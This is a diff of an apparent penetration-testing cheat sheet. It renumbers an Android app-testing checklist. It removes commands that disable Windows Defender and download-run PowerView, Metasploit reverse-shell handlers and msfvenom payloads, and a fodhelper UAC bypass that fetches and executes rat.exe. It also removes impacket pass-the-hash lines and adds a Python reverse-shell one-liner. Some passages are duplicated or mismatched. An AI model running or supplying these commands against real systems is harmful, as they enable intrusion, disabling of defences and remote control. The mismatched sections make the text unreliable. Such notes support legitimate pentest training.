@@ -70,34 +70,34 @@ Start with automated tools to search for low hanging fruits
   <details><summary>Android</summary><blockquote>
     ### Checklist
     <br>
-* unzip -d and apktool -d both (different outputs at time)
+1. unzip -d and apktool -d both (different outputs at time)
     <br>
-* check for /assets and /res/raw (api keys, encryption keys)
+2. check for /assets and /res/raw (api keys, encryption keys)
 <br>
     
-* sensitive files and external storage (world readable  & writeable)
+3. sensitive files and external storage (world readable  & writeable)
     <br>
-* executables & log files on external storage
+4. executables & log files on external storage
     <br>
-* look at manifest (WRITE_EXTERNAL_STORAGE)., grep for "getExternal"
+5. look at manifest (WRITE_EXTERNAL_STORAGE)., grep for "getExternal"
     <br>
-* check for installed package "vnd.android.package-archive" (they want to install something)
+6. check for installed package "vnd.android.package-archive" (they want to install something)
     <br>
-* hidden directories (.folder)
+7. hidden directories (.folder)
     <br>
-* api keys saved as bytearray to obfuscate
+8. api keys saved as bytearray to obfuscate
     <br>
-* identify crypto & understand it
+9. identify crypto & understand it
     <br>
-* webSettings.setJavaScriptEnabled(True); means we might be able to XSS
+10. webSettings.setJavaScriptEnabled(True); means we might be able to XSS
     <br>
-* interesting options: "setAllowContent", "setAllowFileAccess", "setAllowFileAccessFromFileURILS", "setAllowUniversalAccessFromFileURLs", "setJavaScriptEnabled", "setPluginState", "setSavePassword"
+11. interesting options: "setAllowContent", "setAllowFileAccess", "setAllowFileAccessFromFileURILS", "setAllowUniversalAccessFromFileURLs", "setJavaScriptEnabled", "setPluginState", "setSavePassword"
     <br>
-* overwriting ssl errors :facepalm:
+12. overwriting ssl errors :facepalm:
     <br>
-* xss might allow to call Runtime.getRuntime().exec() (CVE-2012-6636) <= Api17
+13. xss might allow to call Runtime.getRuntime().exec() (CVE-2012-6636) <= Api17
       <br>                                                                     
-* use Mitm Proxy (mitm.it has the cert)
+14. use Mitm Proxy (mitm.it has the cert)
       <br>                                                                     
     :smile:
   </blockquote></details>
@@ -137,41 +137,16 @@ Start with automated tools to search for low hanging fruits
 <br/>
 
 <details><summary> <b>ACTIVE DIRECTORY</b> </summary><blockquote>
-  <details><summary>INITIAL ACCESS</summary><blockquote>
+  <details><summary>Initial Access</summary><blockquote>
     :smile:
   </blockquote></details>
-    
-  <details><summary>DOMAIN ENUMERATION</summary><blockquote>
-    # Patch AMSI or disable AV
-    <br>
-    ```powershell
-      Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
-      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_Dev.ps1')
-    ```
-    <br>
-    # Get all the users in the domain
-
-
-    # Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying 
-    ```powershell
-      Get-NetUsers | select samaccountname > username.txt
-      
-      # Get all the computers in the domain
-      Get-NetComputer
-
-      # Get information about specific computer
-      Get-NetComputer -Identity <computer_name>
-
-    ```
-  </blockquote></details>
-    <details><summary>LATERAL MOVEMENT </summary><blockquote>
+  <details><summary>Domain Enumeration And Attack</summary><blockquote>
     :smile:
   </blockquote></details>
-   <details><summary>PERSISTENCE AND CLEARING TRACKS</summary><blockquote>
+    <details><summary>Lateral Movements</summary><blockquote>
     :smile:
   </blockquote></details>
 </blockquote></details>
-
 <br/>
 
 <details><summary> <b>CLOUD</b> </summary><blockquote>
@@ -281,118 +256,7 @@ int main(void){
 <br/>
 <br/>
 
-## Metasploit 
-#### ./ Multi Use Handlers
-
-```bash 
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD <Payload name>
-msf6 > set LHOST <LHOST value>
-msf6 > set LPORT <LPORT value>
-msf6 > set ExitOnSession false
-msf6 > exploit -j -z
-```
-<br/>
-Once the required values are completed the following command will execute your handler: ‘msfconsole -L -r' 
-<br/>
-<br/>
-
-#### ./ Scripting Payloads
-PHP
-
-```bash
-msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port-address> -o shell.php
-```
-
-<br/>
-
-## Python
-#### ./ Spawn a terminal
 
 ```python
-python -c 'import pty;pty.spawn("/bin/bash")';
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 ```
-<details> 
-  <summary> <b>Checking for Null Sessions</b> </summary>
-
-To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.
-
-To connect, you have to type the following command in a Windows shell:
-
-```bash
-> NET USE \\<target IP address>\IPC$ '' /u:''
-```
-
-This tells Windows to connect to the IPC$ share by using an empty password and an empty username!
-
-Let's try the command on our target:
-
-<br/>
-<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
-<br/>
-
-
-The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
-  
-Example:
-<br/>
-<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
-<br/>
-You can also perform the very same checks by using smbclient:
-  
-  proxychains faketime -f +8h impacket-wmiexec -k -no-pass user@10.10.10.10
-<br/>
-<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
-</details>
-
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  
-  <details> 
-  <summary> <b>UAC Bypass</b> </summary>
-    
-    
- https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper
-
-```ps
-https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper
-iwr -Uri http://10.10.10.11/rat.exe -Outfile C:\rat.exe
-
-New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell.exe -exec bypass -c C:\rat.exe" -Force
-
-execute the binary
-C:\Windows\System32\fodhelper.exe
-```
-    
-<br/>
-<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
-<br/>
-
-
-The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
-  
-Example:
-<br/>
-<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
-<br/>
-You can also perform the very same checks by using smbclient:
-    
-    proxychains impacket-psexec -no-pass Administrator@10.10.10.10 -hashes :admin_hash>`
-<br/>
-<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
-</details>
-If skew is -30 minutes 
-The command would be 
-faketime -f -30m
